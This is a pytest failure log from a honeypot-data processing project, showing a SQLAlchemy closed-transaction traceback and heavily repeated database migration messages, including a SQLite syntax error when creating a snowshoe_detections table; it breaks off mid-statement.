/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x77566d9da430>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:39,460:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:39,460:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
Successfully executed: Set default source_generation values
Successfully executed: Set default source_generation values
2025-10-18 18:32:39,460:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:39,460:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:39,460:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:39,460:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:39,460:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:39,460:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:39,460:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:39,460:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:39,461:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:39,461:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
Successfully executed: Create unique index on raw_events
Successfully executed: Create unique index on raw_events
2025-10-18 18:32:39,461:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:39,461:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:39,461:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:39,461:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:39,461:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:39,461:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:39,461:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:39,461:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:39,469:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:39,469:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
Successfully executed: Populate session_id from JSON (SQLite)
Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:39,469:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:39,469:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:39,469:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:39,469:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:39,469:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:39,469:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:39,469:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:39,469:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:39,471:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:39,471:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
Successfully executed: Populate event_type from JSON (SQLite)
Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:39,471:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:39,471:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:39,471:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:39,471:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:39,471:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:39,471:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:39,471:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:39,471:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:39,472:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:39,472:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
Successfully executed: Populate event_timestamp from JSON (SQLite)
Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:39,472:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:39,472:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:39,472:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:39,472:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:39,472:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:39,472:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:39,472:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:39,472:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:39,476:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:39,476:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:39,476:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:39,476:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:39,476:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:39,476:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:39,476:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:39,476:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:39,476:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:39,476:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:39,478:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:39,478:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:39,478:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:39,478:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:39,478:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:39,478:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:39,478:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:39,478:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:39,478:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:39,478:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:39,482:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:39,482:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:39,482:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:39,482:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:39,482:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:39,482:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:39,482:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:39,482:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:39,482:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:39,482:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:39,484:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:39,484:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:39,484:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:39,484:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:39,484:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:39,484:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:39,484:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:39,484:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:39,484:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:39,484:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:39,485:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:39,485:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:39,485:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:39,485:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:39,485:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:39,485:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:39,485:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:39,485:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:39,485:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:39,485:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:39,487:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:39,487:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
SQLite boolean defaults for files.vt_malicious will be set on next schema creation
SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:39,487:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:39,487:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:39,487:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:39,487:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:39,487:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:39,487:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:39,487:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:39,487:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:39,489:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:39,489:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:39,489:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:39,489:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:39,489:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:39,489:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:39,489:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:39,489:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:39,489:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:39,489:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:39,491:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:39,491:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
Starting snowshoe detection schema migration (v8)
Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:39,491:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:39,491:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:39,491:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:39,491:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:39,491:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:39,491:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:39,491:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:39,491:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:39,492:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:39,492:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:39,492:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:39,492:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:39,492:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
